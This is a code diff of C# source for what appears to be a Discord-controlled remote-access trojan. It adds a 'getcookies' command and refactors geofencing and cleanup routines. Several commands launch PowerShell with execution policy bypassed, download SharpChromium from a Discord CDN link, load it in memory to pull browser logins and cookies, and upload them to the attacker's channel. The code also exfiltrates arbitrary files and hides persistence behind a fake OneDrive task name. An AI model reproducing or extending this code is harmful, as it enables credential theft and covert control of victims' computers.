@@ -2,12 +2,10 @@
 using System.Drawing;
 using System.Collections.Generic;
 using System.IO;
-using System.IO.Compression;
 using System.Net;
 using System.Text;
 using System.Diagnostics;
 using System.Net.Http;
-using System.Globalization;
 using System.Management;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -20,6 +18,8 @@ using Discord.WebSocket;
 using Newtonsoft.Json;
 using AForge.Video.DirectShow;
 using AForge.Video;
+
+using static payload.Misc;
 
 namespace payload
 {
@@ -61,7 +61,7 @@ namespace payload
             prefix = args[1];
             if (args[2] != string.Empty) foreach (string item in args[2].Split(',')) geolock.Add(item.ToLower().Trim());
 
-            if (Geocheck()) Uninfect();
+            if (Geocheck(geolock)) Uninfect();
             SetProcessDPIAware();
             try { Process.EnterDebugMode(); } catch { }
 
@@ -100,20 +100,6 @@ namespace payload
             client.StartAsync().GetAwaiter().GetResult();
 
             Thread.Sleep(-1);
-        }
-
-        private static bool Geocheck()
-        {
-            if (geolock.Count > 0)
-            {
-                WebClient wc = new WebClient();
-                string country = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={wc.DownloadString("https://api.ipify.org/?format=txt")}"))["country_name"];
-                wc.Dispose();
-
-                if (!geolock.Contains(country.ToLower()) || !geolock.Contains(CultureInfo.CurrentCulture.EnglishName.ToLower())) return true;
-                return false;
-            }
-            return false;
         }
 
         private static async Task MessageReceived(SocketMessage message)
@@ -207,15 +193,9 @@ namespace payload
                         args.RemoveAt(0);
                         string filepath = string.Join(" ", args);
 
-                        MemoryStream compressed = new MemoryStream();
-                        ZipArchive archive = new ZipArchive(compressed, ZipArchiveMode.Create, true);
-                        ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(filepath), CompressionLevel.Optimal);
-
-                        Stream entrystream = entry.Open();
-                        MemoryStream filestream = new MemoryStream(File.ReadAllBytes(filepath));
-                        filestream.CopyTo(entrystream);
-                        filestream.Dispose();
-                        archive.Dispose();
+                        (MemoryStream, Stream) data = CompressFile(filepath);
+                        MemoryStream compressed = data.Item1;
+                        Stream entrystream = data.Item2;
 
                         if (compressed.Length > 8000000) await message.Channel.SendMessageAsync("File too big.");
                         else await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
@@ -240,7 +220,7 @@ namespace payload
                             StartInfo = new ProcessStartInfo()
                             {
                                 FileName = "powershell.exe",
-                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/966985823138496542/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
+                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
                                 UseShellExecute = false,
                                 RedirectStandardOutput = true,
                                 Verb = "runas"
@@ -253,6 +233,37 @@ namespace payload
                         MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
                         await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
                         ms.Dispose();
+                        break;
+                    }
+                case "getcookies":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        Process cmdproc = new Process()
+                        {
+                            StartInfo = new ProcessStartInfo()
+                            {
+                                FileName = "powershell.exe",
+                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('cookies')))",
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                Verb = "runas"
+                            }
+                        };
+                        cmdproc.Start();
+                        string output = cmdproc.StandardOutput.ReadToEnd();
+                        cmdproc.WaitForExit();
+
+                        List<FileAttachment> paths = new List<FileAttachment>();
+                        string[] lines = output.Split('\n');
+                        foreach (string l in lines)
+                        {
+                            if (l.Contains("[*] All cookies written to"))
+                            {
+                                paths.Add(new FileAttachment(l.Substring(26).Trim()));
+                            }
+                        }
+                        await message.Channel.SendFilesAsync(paths, "SharpChromium output:");
+                        foreach (FileAttachment fa in paths) fa.Dispose();
                         break;
                     }
 
@@ -336,25 +347,6 @@ namespace payload
                         break;
                     }
             }
-        }
-
-        private static void Uninfect()
-        {
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "schtasks.exe",
-                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
-                UseShellExecute = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "taskkill.exe",
-                Arguments = "/f /im powershell.exe",
-                UseShellExecute = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            });
-            Environment.Exit(1);
         }
     }
 }
